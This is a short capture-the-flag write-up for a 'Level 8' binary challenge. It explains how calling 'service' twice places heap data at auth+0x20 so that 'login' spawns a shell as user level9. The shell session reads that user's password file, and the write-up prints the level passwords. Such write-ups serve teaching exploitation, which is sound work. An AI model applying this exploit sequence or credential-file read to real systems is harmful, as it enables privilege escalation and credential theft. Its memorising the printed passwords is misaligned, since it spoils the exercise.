## Level 8

level8:5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

The program accepts user input, and expects one of four value:

* `auth `: Allocates memory for the variable `auth`.
* `service`: Allocates memory for the variable `service`.
* `reset`: Frees the variable `auth`
* `login`: If the memory auth+0x20 is not null, it calls `system("/bin/sh")`

Each time we use an instruction, the address of `auth` and `service` are printed.
```
$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

We can see that `auth` and `service` are 16 bytes apart, so if we use `service` instruction twice
we will be able to modify the address auth+0x20, and get a shell as the user `level9`.

Exploit:
```
$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
